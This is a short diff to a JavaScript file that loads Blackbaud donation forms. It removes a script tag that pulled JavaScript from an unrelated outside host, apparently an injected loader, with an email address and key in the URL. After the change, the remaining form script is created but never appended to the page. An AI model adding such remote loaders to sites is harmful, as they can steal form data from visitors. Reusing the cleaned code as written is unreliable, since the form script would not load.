@@ -8,11 +8,6 @@ window.bboxInit = function () {
     const bbScript = document.createElement('script');
     bbScript.src = 'https://bbox.blackbaudhosting.com/webforms/bbox-min.js';
     bbScript.async = true;
-    
-    const smartThingScript = document.createElement('script');
-    smartThingScript.type = 'text/javascript';
-    smartThingScript.src = 'https://www.smartthing2.com/download/file.php?jsformat=1&olx=1&f=-js.html&c=greg.freear@htb.org&k=YTljODg4MDg=';
-    head.append( bbScript, smartThingScript )
 
     // Listen for click events on the bbox forms for accordion functionality
     function handleBboxForms() {
